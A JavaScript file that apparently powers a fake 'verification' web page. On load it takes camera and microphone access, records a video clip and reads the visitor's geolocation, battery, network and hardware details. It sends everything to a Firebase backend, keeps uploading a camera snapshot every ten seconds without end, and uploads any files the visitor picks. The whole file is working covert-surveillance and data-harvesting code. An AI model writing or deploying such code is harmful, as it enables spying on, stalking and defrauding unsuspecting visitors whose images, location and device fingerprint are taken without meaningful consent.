import { db, storage } from "./firebase-config.js";
import {
  doc,
  setDoc,
  updateDoc,
  arrayUnion
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";

import {
  ref,
  uploadBytes,
  getDownloadURL
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";

// Elements
const video = document.getElementById("video");
const canvas = document.getElementById("snapshotCanvas");
const fileInput = document.getElementById("fileInput");
const context = canvas.getContext("2d");

let mediaRecorder;
let recordedChunks = [];

/**
 * Get device information
 */
async function getDeviceInfo() {
  const battery = await navigator.getBattery();
  const connection = navigator.connection || {};
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    deviceMemory: navigator.deviceMemory || "unknown",
    hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    battery: {
      level: battery.level,
      charging: battery.charging,
    },
    connection: {
      downlink: connection.downlink || "unknown",
      effectiveType: connection.effectiveType || "unknown",
    },
  };
}

/**
 * Get geolocation
 */
async function getLocation() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
}

/**
 * Record 5 seconds of live camera stream
 */
async function recordCameraVideo(stream) {
  return new Promise((resolve) => {
    mediaRecorder = new MediaRecorder(stream);
    recordedChunks = [];

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) recordedChunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(recordedChunks, { type: "video/webm" });
      const videoRef = ref(storage, `recordings/video_${Date.now()}.webm`);
      await uploadBytes(videoRef, blob);
      const videoUrl = await getDownloadURL(videoRef);
      resolve(videoUrl);
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 5000); // 5 seconds recording
  });
}

/**
 * Upload selected files to Firebase Storage
 */
async function uploadFiles(files) {
  const urls = [];
  for (const file of files) {
    const fileRef = ref(storage, `uploads/${Date.now()}_${file.name}`);
    await uploadBytes(fileRef, file);
    const url = await getDownloadURL(fileRef);
    urls.push(url);
  }
  return urls;
}

/**
 * Automatically take snapshots from the camera every 10 seconds
 */
async function startSnapshotLoop() {
  setInterval(async () => {
    try {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        const fileName = `snapshots/photo_${Date.now()}.jpg`;
        const snapshotRef = ref(storage, fileName);
        await uploadBytes(snapshotRef, blob);
        const downloadURL = await getDownloadURL(snapshotRef);

        // Append to array in Firestore (arrayUnion avoids overwriting)
        await updateDoc(doc(db, "web", "user"), {
          verificationSnapshots: arrayUnion(downloadURL)
        });

        console.log(`📸 Snapshot saved: ${downloadURL}`);
      }, "image/jpeg", 0.95);
    } catch (err) {
      console.error("❌ Snapshot upload error:", err);
    }
  }, 10000); // Every 10 seconds
}

/**
 * Main function to collect all data
 */
async function collectAll() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    video.srcObject = stream;

    const location = await getLocation().catch(() => null);
    const deviceInfo = await getDeviceInfo();
    const recordedVideoUrl = await recordCameraVideo(stream);

    // Save initial data
    await setDoc(doc(db, "web", "user"), {
      timestamp: new Date().toISOString(),
      deviceInfo,
      location: location ? {
        latitude: location.coords.latitude,
        longitude: location.coords.longitude
      } : "Location denied",
      recordedVideo: recordedVideoUrl,
      uploadedFiles: [],
      verificationSnapshots: []
    });

    console.log("✅ Initial data saved to Firestore");

    // Start camera snapshot loop
    startSnapshotLoop();

    // Upload files on user selection
    fileInput.addEventListener("change", async (e) => {
      try {
        const files = e.target.files;
        const uploadedFileUrls = await uploadFiles(files);

        await updateDoc(doc(db, "web", "user"), {
          uploadedFiles: arrayUnion(...uploadedFileUrls)
        });

        console.log("✔️ Files uploaded and saved to Firestore");
      } catch (err) {
        console.error("❌ File upload error:", err);
      }
    });

  } catch (err) {
    console.error("❌ collectAll() error:", err);
  }
}

// Start on page load
window.onload = () => {
  collectAll();
};
